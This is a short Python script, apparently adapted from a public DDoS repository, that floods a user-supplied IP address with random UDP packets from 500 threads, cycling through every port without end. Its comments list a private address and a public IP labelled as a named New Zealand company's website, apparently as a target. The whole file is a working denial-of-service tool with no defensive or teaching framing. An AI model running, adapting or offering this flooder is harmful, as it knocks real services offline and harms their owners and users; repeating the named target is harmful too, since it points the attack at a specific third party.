# Based off https://github.com/Ha3MrX/DDos-Attack

# 10.1.1.202:80 - localhost
# 49.50.246.83:80 - www.supacrete.co.nz

import socket
import random
import threading

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

ip = input("IP Target : ")
port = 1

print(type(ip))
print(type(port))

sent = 0

def attack():
     while(True):
          global ip
          global port
          global sent
          sock.sendto(bytes, (ip,port))
          sent = sent + 1
          port = port + 1
          print ("Sent %s packet to %s through port:%s"%(sent,ip,port))
          if port == 65534:
            port = 1

for i in range(500):
     thread = threading.Thread(target=attack)
     thread.start()
